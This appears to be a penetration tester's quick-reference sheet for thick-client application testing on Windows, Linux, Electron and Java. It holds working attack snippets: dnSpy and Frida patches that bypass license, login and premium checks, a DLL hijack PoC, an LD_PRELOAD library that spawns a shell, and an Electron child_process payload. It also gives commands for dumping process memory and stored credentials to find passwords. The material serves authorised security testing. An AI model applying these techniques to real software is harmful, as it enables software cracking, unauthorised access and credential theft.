# Thick Client Quick Reference Guide

Fast lookup for common attacks, tools, and testing patterns. Keep this handy during active testing.

Related: [[THICK-02-Technical-Testing-Checklist]] | [[THICK-03-Request-Tracker]]

---

## Platform-Specific Quick Wins

### Windows Quick Wins (First 15 Minutes)

**Immediate Checks**:
```powershell
# Extract strings
strings64.exe app.exe > strings.txt
findstr /i "password api key secret" strings.txt

# Check file properties
Get-ItemProperty "C:\Path\To\app.exe" | Select *

# Find app data
dir "$env:APPDATA\AppName" /s
dir "$env:LOCALAPPDATA\AppName" /s
dir "$env:PROGRAMDATA\AppName" /s

# Monitor process
# Run Process Monitor (Procmon), filter by app.exe, clear, launch app
```

**If .NET Application**:
```powershell
# 1. Check if .NET
strings64.exe app.exe | findstr "mscoree.dll"

# 2. Open in dnSpy
# Download: https://github.com/dnSpy/dnSpy/releases
# File → Open → app.exe
# Browse code, search for "password", "license", "valid"
```

### Linux Quick Wins (First 15 Minutes)

**Immediate Checks**:
```bash
# Extract strings
strings app | grep -iE "password|api|key|secret|token" > interesting.txt

# Check file type and arch
file app
readelf -h app

# Check for symbols (easier to reverse if not stripped)
readelf -s app | head

# Find config/data
find ~/.config -name "*appname*"
find ~/.local/share -name "*appname*"
find /etc -name "*appname*"

# Monitor syscalls
strace -f ./app 2>&1 | tee strace.log
# Look for: open(), connect(), execve()
```

### Cross-Platform Quick Wins

**Electron Apps**:
```bash
# Check if Electron
# Look for: resources/app.asar

# Extract ASAR
npm install -g asar
asar extract app.asar output/

# Review JavaScript
grep -r "password\|api" output/
grep -r "nodeIntegration.*true" output/  # Dangerous!
```

**Java Apps**:
```bash
# Extract JAR
unzip app.jar -d extracted/

# Decompile with JADX
jadx app.jar -d output/

# Search for secrets
grep -r "password\|api" output/
```

---

## Tool Quick Reference

### dnSpy (C#/.NET Decompilation & Patching)

**Basic Workflow**:
```
1. Open app.exe in dnSpy
2. Analyze → Right-click assembly → Go to Entry Point
3. Browse code structure
4. Search (Ctrl+Shift+K): "password", "license", "isValid", "checkLicense"
5. Find license/auth check
6. Right-click → Edit Method
7. Change logic:
   if (IsLicenseValid()) → if (true)
8. File → Save Module → Save as app_patched.exe
```

**Common C# Bypass Patterns**:
```csharp
// BEFORE: License check
public bool IsLicenseValid() {
    return DateTime.Now < trialEndDate;
}

// AFTER: Always valid
public bool IsLicenseValid() {
    return true;  // Patched
}

// BEFORE: Login check
if (user.Password == hashedInputPassword) {
    return true;
}

// AFTER: Always succeeds
if (true) {  // Bypassed
    return true;
}

// BEFORE: Feature check
if (user.IsPremium) {
    EnablePremiumFeatures();
}

// AFTER: Force premium
if (true) {  // Everyone is premium now
    EnablePremiumFeatures();
}
```

### Process Monitor (Procmon) - Windows

**Essential Filters**:
```
Include: Process Name is app.exe
Exclude: Process Name is System
Exclude: Process Name is svchost.exe
```

**What to Look For**:
- File operations: Config files, temp files, databases
- Registry operations: License keys, settings, credentials
- Network operations: Connections to servers

**Export**: File → Save → All Events → CSV

### Ghidra (Cross-Platform Disassembly)

**Quick Start**:
```
1. File → New Project
2. File → Import File → Select binary
3. Double-click file → Analyze (Yes to all)
4. Window → Defined Strings → Look for interesting strings
5. Double-click string → Shows where it's used
6. F (FunctionName) to rename functions as you understand them
```

### Wireshark (Network Analysis)

**Essential Filters**:
```
# Filter by executable (Windows + Sysmon)
frame.process_name == "app.exe"

# HTTP traffic
http

# Plaintext credentials
http.request.method == "POST" and frame contains "password"

# Non-standard ports
tcp.port > 1024 and tcp.port != 3389 and tcp.port != 5900
```

### Frida (Runtime Manipulation)

**Basic Hook Template**:
```javascript
// Hook a function
Java.perform(function() {
    var MainActivity = Java.use("com.example.MainActivity");
    
    MainActivity.checkLicense.implementation = function() {
        console.log("[*] checkLicense() called - returning true");
        return true;  // Bypass
    };
});
```

---

## Windows-Specific Attacks

### DLL Hijacking

**Quick Test**:
```powershell
# 1. Launch app, check Process Explorer for missing DLLs
# Look for: "NAME NOT FOUND" in Path column

# 2. Common hijackable DLLs:
version.dll
dwmapi.dll
profapi.dll
cryptsp.dll

# 3. Create malicious DLL (Visual Studio):
```

```cpp
// dllmain.cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "DLL Hijacked!", "PoC", MB_OK);
        // Or: WinExec("calc.exe", SW_SHOW);
    }
    return TRUE;
}
```

```powershell
# 4. Compile and place in app directory
# 5. Launch app → MessageBox pops = vulnerable
```

### Registry Inspection

**Common Locations**:
```powershell
# User-specific
Get-ItemProperty "HKCU:\Software\CompanyName\AppName" | fl

# System-wide
Get-ItemProperty "HKLM:\SOFTWARE\CompanyName\AppName" | fl

# 32-bit app on 64-bit OS
Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\CompanyName\AppName" | fl

# Search for sensitive data
Get-ChildItem -Path "HKCU:\Software\AppName" -Recurse | 
    Get-ItemProperty | 
    Where-Object { $_.PSObject.Properties.Value -match "password|key|token|license" }
```

### Windows Credential Manager

```powershell
# List stored credentials
cmdkey /list

# Specific to app
cmdkey /list | Select-String "AppName"

# Or use Credential Manager GUI
control /name Microsoft.CredentialManager
```

---

## Linux-Specific Attacks

### Shared Library Hijacking

**LD_PRELOAD Attack**:
```bash
# 1. Create malicious .so
cat > evil.c << 'EOL'
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void before_main(void) {
    printf("[*] Malicious .so loaded!\n");
    system("/bin/bash");  // Spawn shell
}
EOL

# 2. Compile
gcc -shared -fPIC evil.c -o evil.so

# 3. Run app with preload
LD_PRELOAD=./evil.so ./app
```

**LD_LIBRARY_PATH Attack**:
```bash
# 1. Find libraries app uses
ldd ./app

# 2. Create malicious version of a library
# Place in local directory

# 3. Run with modified path
LD_LIBRARY_PATH=. ./app
```

### ptrace Attachment

```bash
# Attach to running process
sudo gdb -p $(pidof app)

# Dump memory
(gdb) generate-core-file app.core

# Search memory for strings
strings app.core | grep -i password
```

### Config File Hunting

```bash
# User configs
find ~ -name "*app*" -type f 2>/dev/null

# Common locations
~/.config/app/config.json
~/.local/share/app/database.db
~/app/settings.ini

# System configs
/etc/app/config
/opt/app/settings

# Temp files
/tmp/app_*
/var/tmp/app_*
```

---

## Cross-Platform Attacks

### Electron Application Testing

**Check nodeIntegration (RCE Risk)**:
```javascript
// In extracted app source (resources/app/*)
// Look for BrowserWindow creation:

new BrowserWindow({
    webPreferences: {
        nodeIntegration: true,        // BAD! Allows Node in renderer
        contextIsolation: false,      // BAD! No context separation
        webSecurity: false            // BAD! No same-origin policy
    }
});
```

**Exploit if nodeIntegration enabled**:
```javascript
// In DevTools console (F12):
require('child_process').exec('calc.exe');  // Windows
require('child_process').exec('gnome-calculator');  // Linux
```

**Extract ASAR**:
```bash
npm install -g asar
asar extract resources/app.asar output/

# Review JavaScript
grep -r "api_key\|password\|secret" output/
```

### Java Application Testing

**Decompile JAR**:
```bash
# Extract
unzip app.jar -d extracted/

# Decompile with JADX
jadx app.jar -d decompiled/

# Search for secrets
grep -r "password\|api" decompiled/
```

**Common Java Vulnerabilities**:
```java
// Hardcoded credentials
String username = "admin";
String password = "SuperSecret123";

// SQL injection
String query = "SELECT * FROM users WHERE name='" + userName + "'";

// Deserialization (check for ObjectInputStream)
ObjectInputStream ois = new ObjectInputStream(fileInput);
Object obj = ois.readObject();  // Potential RCE
```

---

## Memory Analysis

### Dump Process Memory (Windows)

```powershell
# Using ProcDump (Sysinternals)
procdump64.exe -ma <PID> output.dmp

# Search dump
strings output.dmp | Select-String "password|api|token|key"
```

### Cheat Engine (Windows)

```
1. Open Cheat Engine
2. Select process
3. Scan Type: String
4. Value: [known string, e.g., username]
5. First Scan
6. Type in app, scan again (Next Scan)
7. Find address holding string
8. Right-click → Browse this memory region
9. Look for nearby password/token
```

### GDB Memory Dump (Linux)

```bash
# Attach to process
sudo gdb -p $(pidof app)

# Dump memory region
(gdb) dump memory output.bin 0x400000 0x500000

# Search
strings output.bin | grep password
```

---

## Database Inspection

### SQLite (Common in Thick Clients)

```bash
# Find databases
# Windows:
dir /s *.db *.sqlite *.sqlite3

# Linux:
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null

# Open with sqlite3
sqlite3 database.db

# List tables
.tables

# Dump table
SELECT * FROM users;
SELECT * FROM settings WHERE key LIKE '%password%';

# Dump schema
.schema users
```

---

## Crypto Weaknesses

### Search for Hardcoded Keys

```bash
# Strings search
strings app.exe | grep -E ".{16,}" | grep -v "^[[:print:]]*$"

# In dnSpy (.NET)
# Search: AesCryptoServiceProvider, RijndaelManaged, DESCryptoServiceProvider
# Check constructors for hardcoded keys
```

### Weak Algorithms (C#)

```csharp
// Look for in dnSpy:
DESCryptoServiceProvider           // WEAK - DES
TripleDESCryptoServiceProvider     // WEAK - 3DES  
MD5CryptoServiceProvider           // WEAK - MD5
SHA1                                // WEAK - SHA1

// Better (but check key management):
AesCryptoServiceProvider           // OK
RijndaelManaged                    // OK
SHA256, SHA512                     // OK for hashing
```

---

## Network Interception

### Burp for Thick Clients

```
1. Proxy → Options → Add listener
   - Bind: All interfaces
   - Port: 8080
   - Support invisible proxying: YES

2. Configure app:
   - Windows: netsh winhttp set proxy 127.0.0.1:8080
   - Or app-specific proxy settings

3. Install Burp CA cert:
   - Export from Burp
   - Windows: certmgr.msc → Trusted Root
```

### Echo Mirage (Windows SSL Intercept)

```
1. Run as Administrator
2. Process → Hook
3. Select app.exe
4. Inject → OK
5. View decrypted SSL traffic
```

---

## Quick Evidence Collection

### Screenshots Needed
- [ ] Before bypass (license expired, trial ended, feature disabled)
- [ ] Decompiled code showing vulnerability
- [ ] After bypass (full access enabled)
- [ ] Procmon showing sensitive file access
- [ ] Wireshark showing plaintext credentials
- [ ] Memory showing password
- [ ] DLL hijack PoC (calc.exe launched)

### Files to Save
```
app.exe (original)
app_patched.exe (modified)
config.xml (with secrets)
database.db
memory.dmp
network.pcap
procmon.pml
strings.txt
decompiled_source/
```

---

## Tags
#quick-reference #thick-client #windows #linux #cross-platform #tools

---

## Related Documents
- [[THICK-00-Overview|Overview]]
- [[THICK-01-Admin-Checklist|Admin Checklist]]
- [[THICK-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[THICK-03-Request-Tracker|Request Tracker]]
- [[THICK-04-Evidence-Collection|Evidence Collection]]
- [[THICK-05-Reporting-Template|Reporting Template]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
